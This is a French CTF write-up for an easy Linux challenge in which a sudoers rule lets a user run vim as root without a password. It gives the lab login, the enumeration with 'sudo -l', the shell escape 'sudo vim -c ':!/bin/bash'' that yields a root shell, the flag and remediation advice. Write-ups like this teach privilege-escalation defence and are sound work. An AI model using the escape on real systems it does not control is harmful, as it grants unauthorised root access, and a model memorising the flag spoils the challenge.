# Writeup — Sudo Misconfiguration

**Catégorie** : Linux / Privilege Escalation  
**Difficulté** : Easy  
**Points** : 150  
**Flag** : `CTF{sudo_vim_shell_escape}`

## Contexte

`sudo` permet à des utilisateurs non-root d'exécuter des commandes spécifiques avec des privilèges élevés. Une mauvaise configuration peut autoriser l'exécution d'outils qui permettent de s'échapper vers un shell. Les éditeurs de texte comme `vim`, `nano`, ou `less` offrent des fonctionnalités intégrées pour exécuter des commandes shell — ce qui les rend dangereux si accordés via sudo sans restriction.

## Connexion

```bash
ssh player@<TARGET_IP> -p 5021
# password: player2026
```

## Étapes de résolution

### 1. Énumération initiale

La première chose à vérifier : quelles commandes l'utilisateur peut-il exécuter avec sudo ?

```bash
player@container:~$ sudo -l
```

Sortie attendue :

```
Matching Defaults entries for player on container:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User player may run the following commands on container:
    (ALL) NOPASSWD: /usr/bin/vim
```

Points clés :
- `(ALL)` : peut exécuter en tant que n'importe quel utilisateur, y compris root
- `NOPASSWD` : aucun mot de passe requis
- `/usr/bin/vim` : l'éditeur vim est autorisé

### 2. Identification de la vulnérabilité

`vim` dispose d'un mode commande intégré (accessible avec `:`) qui permet d'exécuter des commandes shell via `:!<commande>`. Si `vim` tourne avec les droits root (via sudo), ce shell héritera des droits root.

On peut vérifier sur GTFOBins la technique exacte : https://gtfobins.github.io/gtfobins/vim/#sudo

### 3. Exploitation

**Méthode 1 — Shell interactif via vim :**

```bash
player@container:~$ sudo vim -c ':!/bin/bash'
```

Explication :
- `sudo vim` : lance vim en tant que root
- `-c ':!/bin/bash'` : exécute la commande vim `:!/bin/bash` dès l'ouverture, ce qui lance bash avec les droits root

Sortie attendue :

```
root@container:~#
```

**Méthode 2 — Depuis vim interactif :**

```bash
player@container:~$ sudo vim
# Dans vim, taper :
:!/bin/bash
# Puis Entrée
```

Vérification :

```bash
root@container:~# whoami
root
root@container:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### 4. Récupération du flag

```bash
root@container:~# cat /root/flag.txt
CTF{sudo_vim_shell_escape}
```

## Explication de la vulnérabilité

La règle sudoers `player ALL=(ALL) NOPASSWD: /usr/bin/vim` est trop permissive. Elle accorde un accès root effectif à l'utilisateur `player` car vim peut exécuter des commandes shell arbitraires via sa fonctionnalité `:!`. Cette "fuite" (escape) vers un shell est documentée pour de nombreux outils : vim, nano, less, more, man, awk, python, perl, ruby, etc.

**Impact réel** : Accès root complet. Un attaquant ayant accès au compte `player` peut immédiatement obtenir un shell root, lire tous les secrets du système, modifier des fichiers critiques ou installer des backdoors persistantes.

## Recommandations de remédiation

1. **Ne jamais accorder l'accès sudo à des éditeurs de texte** tels que vim, nano, emacs.
2. **Si vim est nécessaire**, utiliser les restrictions `sudoedit` à la place :
   ```
   player ALL=(ALL) NOPASSWD: sudoedit /etc/specific-file.conf
   ```
3. **Auditer régulièrement les règles sudoers** :
   ```bash
   sudo visudo -c
   cat /etc/sudoers /etc/sudoers.d/*
   ```
4. **Préférer des outils à usage limité** (ex: `sudoedit` plutôt que `vim` via sudo).
5. **Appliquer le principe du moindre privilège** : accorder uniquement les commandes strictement nécessaires.

## Références

- GTFOBins - vim sudo : https://gtfobins.github.io/gtfobins/vim/#sudo
- MITRE ATT&CK T1548.003 (Sudo and Sudo Caching) : https://attack.mitre.org/techniques/T1548/003/
- sudo(8) man page : https://www.sudo.ws/docs/man/sudo.man/
- sudoers(5) man page : configuration des règles sudo
